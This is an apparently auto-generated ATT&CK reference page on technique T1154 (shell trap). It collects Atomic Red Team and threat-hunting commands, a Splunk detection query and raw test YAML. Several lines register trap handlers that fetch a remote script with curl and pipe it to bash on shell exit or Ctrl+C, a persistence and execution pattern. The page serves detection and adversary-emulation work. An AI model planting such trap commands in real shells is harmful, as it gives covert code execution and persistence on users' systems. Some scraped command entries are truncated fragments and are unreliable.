
# Trap

## Description

### MITRE Description

> The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Linux', 'macOS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1154

## Potential Commands

```
trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt

Bash
icbc @ icbc: / $ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh

> ^ C
Bash
icbc @ icbc: / $ history

693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh
trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
nohup is used for continuing program/script execution even after exit.
trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
```

## Commands Dataset

```
[{'command': 'trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | '
             'bash" EXIT\n'
             'exit\n'
             'trap "nohup sh $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | '
             'bash" SIGINt\n',
  'name': None,
  'source': 'atomics/T1154/T1154.yaml'},
 {'command': 'Bash\n'
             "icbc @ icbc: / $ trap 'nohup curl -sS "
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh\n'
             '\n'
             '> ^ C',
  'name': 'Bash',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Bash\n'
             'icbc @ icbc: / $ history\n'
             '\n'
             "693 trap 'nohup curl -sS "
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh',
  'name': 'Bash',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': "trap 'nohup curl -sS "
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh '
             "| bash' EXIT",
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': 'nohup is used for continuing program/script execution even after '
             'exit.',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': "trap 'nohup curl -sS "
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh '
             "| bash' INT",
  'name': None,
  'source': 'Kirtar22/Litmus_Test'}]
```

## Potential Detections

```json
[{'data_source': 'bash_history logs'}]
```

## Potential Queries

```json
[{'name': None,
  'product': 'Splunk',
  'query': 'index=linux sourcetype=bash_history "trap *" | table '
           'host,user_name,bash_command'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Trap': {'atomic_tests': [{'description': 'After '
                                                                   'exiting '
                                                                   'the shell, '
                                                                   'the script '
                                                                   'will '
                                                                   'download '
                                                                   'and '
                                                                   'execute.\n'
                                                                   '\n'
                                                                   'After '
                                                                   'sending a '
                                                                   'keyboard '
                                                                   'interrupt '
                                                                   '(CTRL+C) '
                                                                   'the script '
                                                                   'will '
                                                                   'download '
                                                                   'and '
                                                                   'execute.\n',
                                                    'executor': {'command': 'trap '
                                                                            '"nohup '
                                                                            'sh '
                                                                            '$PathToAtomicsFolder/T1154/src/echo-art-fish.sh '
                                                                            '| '
                                                                            'bash" '
                                                                            'EXIT\n'
                                                                            'exit\n'
                                                                            'trap '
                                                                            '"nohup '
                                                                            'sh '
                                                                            '$PathToAtomicsFolder/T1154/src/echo-art-fish.sh '
                                                                            '| '
                                                                            'bash" '
                                                                            'SIGINt\n',
                                                                 'name': 'sh'},
                                                    'name': 'Trap',
                                                    'supported_platforms': ['macos',
                                                                            'linux']}],
                                  'attack_technique': 'T1154',
                                  'display_name': 'Trap'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)

* [Persistence](../tactics/Persistence.md)
    

# Mitigations

None

# Actors

None
